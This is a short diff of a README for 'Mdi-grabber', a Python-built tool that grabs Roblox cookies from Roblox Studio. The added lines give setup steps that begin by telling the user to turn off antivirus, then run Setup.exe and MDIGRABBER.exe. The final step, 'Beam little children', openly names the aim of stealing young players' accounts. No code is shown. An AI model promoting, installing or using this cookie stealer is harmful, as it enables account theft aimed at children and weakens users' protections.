@@ -1,5 +1,11 @@
 # Mdi-grabber
-Roblox Exe grabber made with python
+How to download:(
+-----
+1.turn off anti-virus
+2.Download the zip file
+3.Open Setup.exe 
+4.Open MDIGRABBER.exe
+5.Beam little children
 Features
 -----------------------------------
 Grabs Roblox cookies from Roblox Studio
